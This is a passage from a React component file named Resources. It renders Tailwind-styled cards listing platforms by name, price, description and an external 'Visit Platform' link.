                className={`${p.color} border border-white/5 rounded-2xl p-5 hover:border-blue-500/20 transition-all group flex items-start gap-4`}
              >
                <div className="w-12 h-12 rounded-2xl bg-[#0e1628] border border-white/10 flex items-center justify-center text-white font-bold text-xs flex-shrink-0">
                  {p.initials}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <h3 className="text-sm font-bold text-white group-hover:text-blue-400 transition-colors">
                      {p.name}
                    </h3>
                    <span className={`w-2 h-2 rounded-full flex-shrink-0 ${p.dot}`} />
                    <span className="text-xs text-gray-400">{p.price}</span>
                  </div>
                  <p className="text-xs text-gray-400 mt-1 leading-relaxed">{p.desc}</p>
                  <a
                    href={p.url}
                    target="_blank"
                    rel="noreferrer"
                    className="inline-flex items-center gap-1 mt-3 text-xs bg-blue-600 hover:bg-blue-700 text-white font-medium px-4 py-1.5 rounded-lg transition-colors"
                  >
                    Visit Platform →
                  </a>
                </div>
              </div>
            ))}
          </div>
        </section>

      </div>
    </div>
  );
}

export default Resources;
